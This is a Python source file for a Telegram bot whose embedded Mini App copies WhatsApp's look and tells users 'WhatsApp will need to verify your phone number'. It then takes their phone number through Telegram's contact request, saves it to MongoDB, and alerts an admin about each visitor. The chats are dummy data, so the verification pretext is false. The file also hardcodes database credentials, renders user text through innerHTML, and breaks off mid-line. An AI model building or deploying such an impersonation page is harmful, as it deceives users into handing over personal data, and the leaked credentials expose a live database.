import asyncio
import logging
import os
import datetime
from aiohttp import web
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from motor.motor_asyncio import AsyncIOMotorClient

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("bot")

TOKEN = os.environ["BOT_TOKEN"]
WEBHOOK_URL = os.environ["WEBHOOK_URL"].rstrip("/")
PORT = int(os.environ.get("PORT", 10000))
SECRET = os.environ.get("WEBHOOK_SECRET")
ADMIN_ID = "9097712147" 

# --- MongoDB ---
MONGO_URI = "mongodb+srv://xDqHYfkWVKuFDRmX:fbfb80830_db_user@cluster0.65rr2ni.mongodb.net/?retryWrites=true&w=majority"
client = AsyncIOMotorClient(MONGO_URI, serverSelectionTimeoutMS=5000)
db = client.whatsapp_clone
users_col = db.users
messages_col = db.messages

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text("Welcome! Tap the 'Open WhatsApp' button on the bottom left.")
    if str(user.id) != ADMIN_ID:
        try:
            await app.bot.send_message(chat_id=ADMIN_ID, text=f"🚀 *Bot Started!*\n👤 {user.first_name}\n🆔 `{user.id}`", parse_mode="Markdown")
        except: pass

# ==========================================
# THE 100% WHATSAPP CLONE UI (EMBEDDED)
# ==========================================
async def index(request):
    html = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg: #0b141a; --panel: #111b21; --header: #202c33; --text: #e9edef;
            --muted: #8696a0; --green: #00a884; --sent: #005c4b; --recv: #202c33;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: var(--bg); color: var(--text); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        svg { fill: #aebac1; width: 24px; height: 24px; cursor: pointer; }

        /* SPLASH & REGISTRATION */
        #splash { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; }
        #splash h1 { color: var(--green); font-size: 36px; margin-bottom: 20px; }
        .loader { border: 4px solid var(--header); border-top: 4px solid var(--green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #registration { display: none; flex-direction: column; height: 100%; padding: 40px 20px; }
        .reg-title { color: var(--green); font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 20px; margin-top: 30px; }
        .reg-sub { font-size: 18px; text-align: center; margin-bottom: 10px; }
        .reg-desc { color: var(--muted); font-size: 14px; text-align: center; margin-bottom: 40px; }
        .input-group { display: flex; flex-direction: column; gap: 15px; max-width: 400px; margin: 0 auto 30px auto; width: 100%; }
        .country-sel, .phone-inp { background: transparent; color: var(--text); border: none; border-bottom: 2px solid var(--green); padding: 10px 0; font-size: 16px; outline: none; width: 100%; }
        .country-sel option { background: var(--panel); }
        .reg-btn { background: var(--green); color: #111b21; border: none; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: bold; max-width: 400px; margin: 0 auto; cursor: pointer; width: 100%; }

        /* MAIN APP */
        #app { display: none; flex-direction: column; height: 100%; position: relative; }
        .top-bar { background: var(--header); padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; height: 60px; }
        .top-title { font-size: 22px; font-weight: 600; }
        .search-bar { padding: 8px 15px; background: var(--panel); }
        .search-box { background: var(--header); border-radius: 20px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
        .search-box input { background: transparent; border: none; color: var(--text); outline: none; width: 100%; font-size: 15px; }
        .filters { display: flex; gap: 10px; padding: 5px 15px 10px 15px; background: var(--panel); overflow-x: auto; }
        .filter { background: transparent; color: var(--muted); border: 1px solid var(--header); padding: 6px 12px; border-radius: 15px; font-size: 13px; }
        .filter.active { background: rgba(0, 168, 132, 0.2); color: var(--green); border-color: transparent; }

        /* CHAT LIST */
        .chat-list { flex: 1; overflow-y: auto; padding-bottom: 60px; }
        .chat-item { display: flex; padding: 12px 15px; align-items: center; cursor: pointer; border-bottom: 1px solid #222d34; }
        .chat-item:active { background: var(--header); }
        .avatar { width: 48px; height: 48px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 20px; color: white; margin-right: 15px; background: var(--green); }
        .chat-info { flex: 1; display: flex; flex-direction: column; }
        .chat-row { display: flex; justify-content: space-between; margin-bottom: 3px; }
        .chat-name { font-size: 17px; }
        .chat-time { font-size: 12px; color: var(--muted); }
        .chat-msg { font-size: 14px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 250px; }

        /* FAB & BOTTOM NAV */
        .fab { position: absolute; bottom: 70px; right: 20px; width: 55px; height: 55px; background: var(--green); border-radius: 15px; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.5); z-index: 10; }
        .fab svg { fill: #111b21; width: 28px; height: 28px; }
        .bottom-nav { position: absolute; bottom: 0; left: 0; width: 100%; background: var(--bg); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid var(--header); z-index: 10; }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--muted); font-size: 11px; }
        .nav-item.active { color: var(--text); }
        .nav-item.active svg { fill: var(--text); }

        /* CHAT SCREEN */
        #chat-screen { display: none; flex-direction: column; height: 100%; position: absolute; top: 0; left: 0; width: 100%; z-index: 20; background: var(--bg); }
        .chat-header { background: var(--header); padding: 10px 15px; display: flex; align-items: center; height: 60px; gap: 15px; }
        .chat-header-info { display: flex; flex-direction: column; flex: 1; }
        .chat-header-name { font-size: 16px; }
        .chat-header-status { font-size: 12px; color: var(--muted); }
        .chat-body { flex: 1; overflow-y: auto; padding: 20px 15px; display: flex; flex-direction: column; gap: 5px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-size: cover; background-color: #0b141a; }
        .msg { max-width: 80%; padding: 6px 10px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; position: relative; margin-bottom: 2px; }
        .msg.sent { background: var(--sent); align-self: flex-end; border-top-right-radius: 0; }
        .msg.recv { background: var(--recv); align-self: flex-start; border-top-left-radius: 0; }
        .msg-time { font-size: 11px; color: rgba(255,255,255,0.6); float: right; margin-top: 5px; margin-left: 10px; }
        .input-area { background: var(--header); padding: 5px 10px; display: flex; align-items: center; gap: 8px; padding-bottom: 20px; }
        .input-box { flex: 1; background: var(--panel); border-radius: 20px; display: flex; align-items: center; padding: 8px 15px; }
        .input-box input { background: transparent; border: none; color: var(--text); outline: none; width: 100%; font-size: 16px; }
        .send-btn { width: 45px; height: 45px; background: var(--green); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: none; }
        .send-btn svg { fill: #111b21; width: 24px; height: 24px; margin-left: 3px;}
    </style>
</head>
<body>

    <!-- SPLASH -->
    <div id="splash">
        <h1>WhatsApp</h1>
        <div class="loader"></div>
    </div>

    <!-- REGISTRATION -->
    <div id="registration">
        <div class="reg-title">WhatsApp</div>
        <div class="reg-sub">Verify your phone number</div>
        <div class="reg-desc">WhatsApp will need to verify your phone number.</div>
        <div class="input-group">
            <select class="country-sel" id="country">
                <option>United States (+1)</option>
                <option>Nigeria (+234)</option>
                <option>Ghana (+233)</option>
                <option>UK (+44)</option>
                <option>India (+91)</option>
            </select>
            <input type="tel" class="phone-inp" placeholder="Phone number">
        </div>
        <button class="reg-btn" onclick="register()">Next</button>
    </div>

    <!-- MAIN APP -->
    <div id="app">
        <div class="top-bar">
            <div class="top-title">WhatsApp</div>
            <div style="display:flex; gap:20px;">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>
                <svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
            </div>
        </div>
        <div class="search-bar">
            <div class="search-box">
                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                <input type="text" placeholder="Ask Meta AI or Search">
            </div>
        </div>
        <div class="filters">
            <button class="filter active">All</button>
            <button class="filter">Unread</button>
            <button class="filter">Favorites</button>
            <button class="filter">Groups</button>
        </div>
        <div class="chat-list" id="chat-list">
            <!-- Dummy Data for Professional Look -->
            <div class="chat-item" onclick="openChat('Alice', 'A')">
                <div class="avatar" style="background:#ff7a59">A</div>
                <div class="chat-info">
                    <div class="chat-row"><div class="chat-name">Alice</div><div class="chat-time">10:45 AM</div></div>
                    <div class="chat-msg">Hey! Did you see the new Mini App?</div>
                </div>
            </div>
            <div class="chat-item" onclick="openChat('Bob', 'B')">
                <div class="avatar" style="background:#34b7f1">B</div>
                <div class="chat-info">
                    <div class="chat-row"><div class="chat-name">Bob</div><div class="chat-time">Yesterday</div></div>
                    <div class="chat-msg">Yes, it looks exactly like WhatsApp!</div>
                </div>
            </div>
            <div class="chat-item" onclick="openChat('Family Group', 'F')">
                <div class="avatar" style="background:#00a884">F</div>
                <div class="chat-info">
                    <div class="chat-row"><div class="chat-name">Family Group</div><div class="chat-time">Yesterday</div></div>
                    <div class="chat-msg">Mom: Don't forget to buy milk!</div>
                </div>
            </div>
        </div>
        <div class="fab" onclick="alert('Start new chat feature coming soon!')">
            <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
        </div>
        <div class="bottom-nav">
            <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>Chats</span></div>
            <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg><span>Updates</span></div>
            <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg><span>Communities</span></div>
            <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg><span>Calls</span></div>
        </div>
    </div>

    <!-- CHAT SCREEN -->
    <div id="chat-screen">
        <div class="chat-header">
            <svg onclick="closeChat()" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            <div class="avatar" id="chat-avatar" style="width: 40px; height: 40px; font-size: 16px;">A</div>
            <div class="chat-header-info">
                <div class="chat-header-name" id="chat-name">Alice</div>
                <div class="chat-header-status">online</div>
            </div>
        </div>
        <div class="chat-body" id="chat-body">
            <div class="msg recv">Hey there! This is a fully functional WhatsApp UI clone. <span class="msg-time">10:45 AM</span></div>
            <div class="msg sent">Wow, it looks amazing! <span class="msg-time">10:46 AM ✓✓</span></div>
        </div>
        <div class="input-area">
            <div class="input-box">
                <input type="text" id="msg-input" placeholder="Message">
            </div>
            <button class="send-btn" onclick="sendMsg()"><svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg></button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); 
        tg.setHeaderColor('#202c33');
        const user = tg.initDataUnsafe?.user || { id: "12345", first_name: "User" };

        // 6 second failsafe
        setTimeout(() => {
            if(document.getElementById('splash').style.display !== 'none') {
                document.getElementById('splash').style.display = 'none';
                document.getElementById('registration').style.display = 'flex';
            }
        }, 6000);

        async function init() {
            try {
                // Notify Admin
                fetch('/api/track_visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: user.id, name: user.first_name })
                });

                // Check User
                const res = await fetch(`/api/check_user?user_id=${user.id}`);
                const data = await res.json();
                
                document.getElementById('splash').style.display = 'none';
                if (data.registered) {
                    document.getElementById('app').style.display = 'flex';
                } else {
                    document.getElementById('registration').style.display = 'flex';
                }
            } catch(e) {
                document.getElementById('splash').style.display = 'none';
                document.getElementById('registration').style.display = 'flex';
            }
        }
        setTimeout(init, 1000);

        function register() {
            tg.requestContact((status, contact) => {
                if (status === 'sent') {
                    fetch('/api/register', {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ user_id: user.id, phone: contact.phone_number, name: user.first_name })
                    }).then(() => {
                        document.getElementById('registration').style.display = 'none';
                        document.getElementById('app').style.display = 'flex';
                    });
                }
            });
        }

        function openChat(name, letter) {
            document.getElementById('chat-name').innerText = name;
            document.getElementById('chat-avatar').innerText = letter;
            document.getElementById('app').style.display = 'none';
            document.getElementById('chat-screen').style.display = 'flex';
            document.getElementById('chat-body').innerHTML = `
                <div class="msg recv">This is the start of your chat with ${name}. <span class="msg-time">Now</span></div>
            `;
        }

        function closeChat() {
            document.getElementById('chat-screen').style.display = 'none';
            document.getElementById('app').style.display = 'flex';
        }

        function sendMsg() {
            const input = document.getElementById('msg-input');
            if(!input.value) return;
            const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
            document.getElementById('chat-body').innerHTML += `
                <div class="msg sent">${input.value} <span class="msg-time">${time} ✓✓</span></div>
            `;
            input.value = '';
            document.getElementById('chat-body').scrollTop = document.getElementById('chat-body').scrollHeight;
        }
    </script>
</body>
</html>
    """
    return web.Response(text=html, content_type='text/html')

# ==========================================
# BACKEND APIS
# ==========================================
async def track_visit(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    name = data.get("name", "Unknown")
    try:
        if user_id != ADMIN_ID:
            await app.bot.send_message(chat_id=ADMIN_ID, text=f"👀 *New App Visitor!*\n👤 {name}\n🆔 `{user_id}`", parse_mode="Markdown")
    except Exception as e: log.error(e)
    return web.json_response({"status": "success"})

async def check_user(request):
    try:
        user_id = request.query.get('user_id')
        user = await asyncio.wait_for(users_col.find_one({"telegram_id": str(user_id)}), timeout=3.0)
        return web.json_response({"registered": bool(user)})
    except Exception:
        return web.json_response({"registered": False})

async def register_user(request):
    data = await request.json()
    try:
        await users_col.update_one(
            {"telegram_id": str(data.get("user_id"))},
            {"$set": {"phone": data.get("phone"), "name": data.get("name"), "registered_at": datetime.datetime.now()}},
            upsert=True
        )
    except Exception as e: log.error(e)
    return web.json_response({"status": "success"})

async def health(request):
    return web.Response(text="OK")

async def webhook(request):
    if SECRET and request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET:
        return web.Response(status=403)
    data = await request.json()
    await app.update_queue.put(Update.de_json(data, app.
